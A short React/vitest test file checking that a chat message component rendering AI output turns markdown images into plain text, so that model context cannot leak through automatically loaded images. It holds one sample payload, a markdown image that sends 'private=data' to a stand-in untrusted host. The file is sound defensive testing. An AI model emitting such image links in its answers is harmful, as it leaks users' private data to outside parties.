import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, test } from "vitest";
import { MessageResponse } from "./message";
describe("private AI output", () => {
  test("cannot exfiltrate model context through automatically loaded images", () => {
    const html = renderToStaticMarkup(
      <MessageResponse>
        {"![Preview](https://untrusted.example.invalid/pixel?private=data)"}
      </MessageResponse>,
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("untrusted.example.invalid");
    expect(html).toContain("Image: Preview");
  });
});
